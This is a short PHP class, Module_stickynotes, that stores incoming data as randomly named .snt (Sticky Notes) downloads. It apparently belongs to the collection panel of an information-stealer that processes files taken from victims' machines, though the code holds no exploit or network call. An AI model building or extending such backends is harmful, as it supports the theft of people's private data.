<?php

	class Module_stickynotes extends Module_
	{
		public function process_module($Data, $Version)
		{
			error_reporting(E_ALL);
			switch ($Version)
			{
				case 0:
				{
					$this->insert_downloads(MakeRandomString(10, TRUE) . ".snt",  $Data);
					break;
				}
				default:
					return FALSE;
			}
			
			return TRUE;
		}
	}